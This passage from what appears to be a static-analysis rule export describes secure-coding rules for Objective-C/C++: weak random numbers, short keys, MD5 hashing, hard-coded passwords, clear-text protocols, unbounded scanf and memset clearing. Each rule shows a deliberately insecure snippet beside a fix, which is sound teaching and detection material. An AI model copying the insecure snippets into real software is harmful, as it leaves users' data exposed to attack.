Example</h2>\n<pre>\n#include &lt;random&gt;\n// ...\n\nvoid f() {\n  int random_int = std::rand(); // Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n#include &lt;sodium.h&gt;\n#include &lt;botan/system_rng.h&gt;\n// ...\n\nvoid f() {\n  char random_chars[10];\n  randombytes_buf(random_chars, 10); // Compliant\n  uint32_t random_int = randombytes_uniform(10); // Compliant\n\n  uint8_t random_chars[10];\n  Botan::System_RNG system;\n  system.randomize(random_chars, 10); // Compliant\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/338\">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1241\">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UNcxBQ\">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/2ns-BQ\">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM\">Predictable Pseudo Random Number\n  Generator</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S4426": {
        "name": "Cryptographic keys should be robust",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>\n<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>\n<ul>\n  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>\n  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.\n    <ul>\n      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key\n      Derivation Function 2) </li>\n    </ul>  </li>\n</ul>\n<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at\nthe plaintext.</p>\n<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this\ndata after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the\nalgorithm.</p>\n<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,\na 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>\n<h4>Noncompliant code example</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/pubkey.h&gt;\n#include &lt;botan/rng.h&gt;\n#include &lt;botan/rsa.h&gt;\n\nvoid encrypt() {\n    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);\n    Botan::RSA_PrivateKey                           rsaKey(*rng, 1024); // Noncompliant\n}\n</pre>\n<p>Here is an example with the generation of a key as part of a Discrete Logarithmic (DL) group, a Digital Signature Algorithm (DSA) parameter:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n#include &lt;botan/dl_group.h&gt;\n\nvoid encrypt() {\n    Botan::DL_Group(\"dsa/botan/1024\"); // Noncompliant\n}\n</pre>\n<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve\nname:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n#include &lt;botan/ec_group.h&gt;\n\nvoid encrypt() {\n    Botan::EC_Group(\"secp160k1\"); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/pubkey.h&gt;\n#include &lt;botan/rng.h&gt;\n#include &lt;botan/rsa.h&gt;\n\nvoid encrypt() {\n    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);\n    Botan::RSA_PrivateKey                           rsaKey(*rng, 2048);\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n#include &lt;botan/dl_group.h&gt;\n\nvoid encrypt() {\n    Botan::DL_Group(\"dsa/botan/2048\");\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\n#include &lt;botan/ec_group.h&gt;\n\nvoid encrypt() {\n    Botan::EC_Group(\"secp224k1\");\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>\n<p>The appropriate choices are the following.</p>\n<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>\n<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>\n<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of\n<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>\n<h4>AES (Advanced Encryption Standard)</h4>\n<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying\nall possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.\nTherefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>\n<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>\n<h4>Elliptic Curve Cryptography (ECC)</h4>\n<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve\nalgorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>\n<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>\n<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve\nparameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves\ncurrently include:</p>\n<ul>\n  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>\n  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>\n  <li> Curve448. </li>\n  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>\n</ul>\n<h3>Going the extra mile</h3>\n<h4>Pre-Quantum Cryptography</h4>\n<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep\nin mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or\n\"post-quantum\") counterpart.</p>\n<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>\n<p><a href=\"https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation\">Learn more here</a>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> Documentation\n    <ul>\n      <li> NIST Documentation - <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf\">NIST SP 800-186: Recommendations\n      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>\n      <li> IETF - <a href=\"https://datatracker.ietf.org/doc/html/rfc5639\">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and\n      Curve Generation</a> </li>\n    </ul>  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n#include &lt;botan/hash.h&gt;\n// ...\n\nBotan::secure_vector&lt;uint8_t&gt; f(std::string input){\n    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create(\"MD5\")); // Sensitive\n    return hash-&gt;process(input);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n#include &lt;botan/hash.h&gt;\n// ...\n\nBotan::secure_vector&lt;uint8_t&gt; f(std::string input){\n    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create(\"SHA-512\")); // Compliant\n    return hash-&gt;process(input);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule looks for hard-coded credentials in variable names that match any of the patterns from the provided list.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\ndbi_conn conn = dbi_conn_new(\"mysql\");\nstring password = \"secret\"; // Sensitive\ndbi_conn_set_option(conn, \"password\", password.c_str());\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndbi_conn conn = dbi_conn_new(\"mysql\");\nstring password = getDatabasePassword(); // Compliant\ndbi_conn_set_option(conn, \"password\", password.c_str()); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "objc:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nchar* http_url = \"http://example.com\"; // Sensitive\nchar* ftp_url = \"ftp://anonymous@example.com\"; // Sensitive\nchar* telnet_url = \"telnet://anonymous@example.com\"; // Sensitive\n</pre>\n<pre>\n#include &lt;curl/curl.h&gt;\n\nCURL *curl_ftp = curl_easy_init();\ncurl_easy_setopt(curl_ftp, CURLOPT_URL, \"ftp://example.com/\"); // Sensitive\n\nCURL *curl_smtp = curl_easy_init();\ncurl_easy_setopt(curl_smtp, CURLOPT_URL, \"smtp://example.com:587\"); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nchar* https_url = \"https://example.com\";\nchar* sftp_url = \"sftp://anonymous@example.com\";\nchar* ssh_url = \"ssh://anonymous@example.com\";\n</pre>\n<pre>\n#include &lt;curl/curl.h&gt;\n\nCURL *curl_ftps = curl_easy_init();\ncurl_easy_setopt(curl_ftps, CURLOPT_URL, \"ftp://example.com/\");\ncurl_easy_setopt(curl_ftps, CURLOPT_USE_SSL, CURLUSESSL_ALL); // FTP transport is done over TLS\n\nCURL *curl_smtp_tls = curl_easy_init();\ncurl_easy_setopt(curl_smtp_tls, CURLOPT_URL, \"smtp://example.com:587\");\ncurl_easy_setopt(curl_smtp_tls, CURLOPT_USE_SSL, CURLUSESSL_ALL); // SMTP with STARTTLS\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data Exposure\n  </a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S1079": {
        "name": "\"scanf()\" and \"fscanf()\" format strings should specify a field width for the \"%s\" string placeholder",
        "htmlDesc": "<p>The <code>%s</code> format specifier is used to read a string into a buffer. If the input string exceeds the size of this buffer, a buffer overflow\ncan occur.</p>\n<h2>Why is this an issue?</h2>\n<p>By default, there is no limit on the length of the string being read. The <code>scanf</code> family of functions will continue to read characters\ninto the buffer until they encounter a whitespace character.</p>\n<p>If the input contains a string that is long enough and lacks whitespace characters, it can result in memory beyond the end of the buffer being\noverwritten. This situation is known as a buffer overflow vulnerability.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker could exploit this vulnerability to overwrite memory used by the application. This could result in the modification of application\ndata, unexpected behavior, or even cause the application to become unstable or crash. In some cases, the attacker might also gain control over the\nexecution flow of the application, leading to arbitrary code execution.</p>\n<h2>How to fix it</h2>\n<p>A field width can be used together with the <code>%s</code> format specifier. This places an upper limit on the number of characters that will be\nread into the buffer.</p>\n<p>Note that the <code>%s</code> format specifier always null-terminates the string in the buffer. You will need to ensure that the buffer is large\nenough to hold the required input and the null terminator.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nchar buffer[10];\nscanf(\"%s\", buffer);  // Noncompliant\n</pre>\n<p>If this code is given the word <code>noncompliant</code> as an input, <code>noncomplia</code> will be stored in <code>buffer</code> and\n<code>nt␀</code> will overwrite the contents of the memory immediately following <code>buffer</code>.</p>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nchar buffer[10];\nscanf(\"%9s\", buffer);\n</pre>\n<p>If this code is given the word <code>noncompliant</code> as an input, <code>noncompli␀</code> will be stored in <code>buffer</code>.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Buffer_overflow\">Buffer overflow</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input</a> ('Classic Buffer Overflow')\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/676\">CWE-676 - Use of Potentially Dangerous Function</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S5798": {
        "name": "\"memset\" should not be used to delete sensitive data",
        "htmlDesc": "<p>If a buffer contains sensitive data, such as passwords or access tokens, it is good practice to overwrite the buffer before releasing the memory.\nThis ensures that the sensitive data is not available when that memory is reallocated. The <code>memset</code> function is commonly used for this\npurpose.</p>\n<h2>Why is this an issue?</h2>\n<p>The C language specification allows the compiler to remove unnecessary code during the optimization phase. For example, when a memory buffer is\nabout to be destroyed, any writes to that buffer may be seen as unnecessary to the operation of the program. The compiler may choose to remove these\nwrite operations.</p>\n<p>When the <code>memset</code> function is used to clear sensitive data from memory and that memory is destroyed immediately afterward, the compiler\nmay see the <code>memset</code> call as unnecessary and remove it. The sensitive data will, therefore, remain in memory.</p>\n<p>This rule raises an issue when a call to <code>memset</code> is followed by the destruction of the buffer.</p>\n<h2>How to fix it</h2>\n<p>The function <a href=\"https://en.cppreference.com/w/c/string/byte/memset\"><code>memset_s</code></a> behaves similarly to <code>memset</code>. The\nmain difference is that it cannot be optimized away and the memory will be overwritten in all cases. You should use <code>memset_s</code> to clear\nsecurity-sensitive data.</p>\n<p>The <code>memset_s</code> function is defined in annex K of C11 and is optional for C11 compilers. It will only be available if the macro\n<code>__STDC_LIB_EXT1__</code> is defined, and it must be enabled by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before including\n<code>&lt;string.h&gt;</code>.</p>\n<p>Other platform-specific functions can perform the same operation, such as <a\nhref=\"https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)?redirectedfrom=MSDN\">SecureZeroMemory</a> (Windows)\nor <a href=\"https://www.freebsd.org/cgi/man.cgi?query=explicit_bzero\">explicit_bzero</a> (FreeBSD).</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;string&gt;\n\nvoid f(char *password, size_t bufferSize) {\n  char localToken[256];\n  init(localToken, password);\n  memset(password, 0, strlen(password));  // Noncompliant\n  memset(localToken, 0, strlen(localToken));  // Noncompliant\n  free(password);\n}\n</pre>\n<p>The <code>memset</code> calls may be optimized away because <code>password</code> is about to be freed and <code>localToken</code> is about to go\nout of scope.</p>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#define __STDC_WANT_LIB_EXT1__\n#include &lt;string&gt;\n\nvoid f(char *password, size_t bufferSize) {\n  char localToken[256];\n  init(localToken, password);\n  memset_s(password, bufferSize, 0, strlen(password));\n  memset_s(localToken, sizeof(localToken), 